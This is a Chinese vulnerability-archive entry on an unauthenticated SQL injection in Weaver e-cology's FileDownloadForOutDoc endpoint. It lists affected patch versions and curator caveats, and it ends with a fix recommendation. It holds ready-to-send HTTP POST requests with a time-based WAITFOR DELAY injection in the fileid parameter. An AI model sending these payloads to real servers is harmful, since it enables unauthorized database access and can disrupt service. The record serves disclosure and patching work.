---
source: "MrWQ/vulnerability-paper"
title: "泛微e-cology FileDownloadForOutDoc SQL注入"
product: "泛微e-cology"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "部分8/9且补丁<10.58.0，修复>=10.58"
prerequisites: "前台无凭证样本"
side_effects: "延迟探测可能占用数据库连接或影响服务"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/Qnmy1vRfE4WBu4hyhBNkQg"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AE%20OA%20e-cology%20FileDownloadForOutDoc%20%E5%89%8D%E5%8F%B0%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
id: "vw-170c23e2f0bce8d46f58674f"
entity_id: "ve-170c23e2f0bce8d46f58674f"
schema_version: "1"
---

# 泛微e-cology FileDownloadForOutDoc SQL注入

## 条目说明

- 对象与具体问题：泛微e-cology；FileDownloadForOutDoc SQL注入
- 版本、配置及部署条件：部分8/9且补丁<10.58.0，修复>=10.58
- 认证与权限前提：前台无凭证样本
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 相比另一短篇新增HTTP响应及修复链接，宜合并保留
- 两个请求仅fileid差异；{everything}用途未解释，200空响应本身不能证明延迟注入

## 操作风险

延迟探测可能占用数据库连接或影响服务。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Qnmy1vRfE4WBu4hyhBNkQg)

**本文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。**

**漏洞说明**

        泛微 e-cology 是一款由泛微网络科技开发的协同管理平台，支持人力资源、财务、行政等多功能管理和移动办公。

        泛微 e-cology FileDownloadForOutDoc 未对用户的输入进行有效的过滤，直接将其拼接进了 SQL 查询语句中，导致系统出现 SQL 注入漏洞。

**影响版本**

```
部分e-cology 8且补丁版本<10.58.0
部分e-cology 9且补丁版本<10.58.0

```

**漏洞复现**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbV81PXWiaokevaYtVIUE3dFKGpEib1Z8ibptFyRg3ibBo0LEMx8hOlgU8fSCcx3CHs49wTcszfX0PVOpg/640?wx_fmt=png)

payload：  

```http
POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Content-Length: 45
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close
fileid=3+WAITFOR+DELAY+'0:0:8'&isFromOutImg=1

```

请求包：  

```http
POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Content-Length: 45
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close
fileid={everything}+WAITFOR+DELAY+'0:0:8'&isFromOutImg=1

```

响应包：  

```
HTTP/1.1 200 OK
Server: WVS
Cache-Control: private
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1
Set-Cookie: ecology_JSessionid=a*******************y; path=/
Content-Length: 0
Connection: close
Date: Tue, 11 Jul 2023 12:54:14 GMT

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbV81PXWiaokevaYtVIUE3dFKIuMdp7CDcO2YpprpVlibed6mX6AqasDA6q1ia2Dhcs3O7QB9TjU95fJg/640?wx_fmt=png)

**修复建议**

目前官方已发布安全补丁，建议受影响用户尽快将补丁版本升级至 10.58 及以上。https://www.weaver.com.cn/cs/securityDownload.asp#

本文章仅用于学习交流，不得用于非法用途

星标加关注，追洞不迷路

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
